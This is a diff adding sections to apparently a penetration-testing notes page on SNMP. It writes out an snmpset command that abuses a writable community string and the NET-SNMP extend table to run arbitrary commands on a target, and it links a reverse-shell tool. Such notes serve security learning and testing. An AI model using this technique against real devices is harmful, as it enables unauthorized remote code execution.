@@ -48,6 +48,29 @@ snmpwalk -c <community_string> -v1 <target> <OID>
 
 `-c`: defines the community sting.
 
+### SNMP Extended
+
+Get Extended attributes
+
+```bash
+snmpwalk -v X -c public <IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
+```
+
+### SNMP RCE
+
+Using private key with write permissions it is possible exploit the extended object table and run arbitrary commands on the target machine
+
+```bash
+snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c <private_community_string> <target> \
+'nsExtendStatus."evilcommand"' = createAndGo \
+'nsExtendCommand."evilcommand"' = /bin/echo \
+'nsExtendArgs."evilcommand"' = 'hello world'
+```
+
+The repo below leverage this to reverse shell using python script&#x20;
+
+{% embed url="https://github.com/mxrch/snmp-shell" %}
+
 ## References
 
 {% embed url="https://www.pcmag.com/encyclopedia/term/snmp" %}
